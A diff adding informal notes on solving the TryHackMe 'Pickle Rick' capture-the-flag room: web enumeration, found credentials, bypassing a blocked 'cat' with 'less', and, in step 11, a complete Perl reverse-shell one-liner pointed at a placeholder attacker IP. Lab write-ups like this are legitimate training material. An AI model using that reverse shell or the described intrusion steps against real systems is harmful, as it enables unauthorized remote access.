@@ -1,0 +1,55 @@
+# Notes for the TryHackMe Box "Pickle Rick"
+# Writeup by k3rmit @github: ak3rmit
+
+
+1. Found Username in the boxes web quellcode Username: R1ckRul3s
+
+2. Nmap discovered an open 80 tcp web port for apache 2.4.12 and an open ssh port
+   Tried to break in with 
+   $ ssh R1ckRul3s@10.10.3.148
+   Gets refused because I didn't have the RSA key
+
+3. Gobuster scan bought 4 directorys
+   
+   /asstes
+   /index.html
+   /login.php seems interestin
+   /robots.txt
+
+
+4. Tried simple sql Injection but failed ('or1==1)
+
+5. Found interesting String "Wubbalubbadubdub" try to use this as password
+
+6. Since I have a username to work with I make a bruteforce attack using Hydra with the rockyou wordlist.
+   Forget Hydra! "Wubbalubbadubdub" works as pw with R1ckRul3s username
+
+7. We now come to an Page where we can execute commands an ls list following
+
+	Sup3rS3cretPickl3Ingred.txt //looks very susipicious
+	assets
+	clue.txt
+	denied.php
+	index.html
+	login.php
+	portal.php
+	robots.txt
+
+
+8. $ cat Sup3rS3cretPickl3Ingred.txt doesn't work cause cat is disables
+
+9. less command seems to work try it with that 
+   $ less Sup3rS3cretPickl3Ingred.txt  returns our first flag yay
+
+10. looking around the system
+    $ cd ../.. && ls // it goes always to basic directory again that sucks try to reverse shell 
+
+
+11. Try to use an perl reverse shell 
+	perl -e 'use Socket;$i="attackerip";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+	DOES WORK YES were now fully control of the bash shell and can forget about that shitty interface 
+
+12 last two flags are in the root directory and in the /home/rick directory
+
+Easy but very  fun challenge.
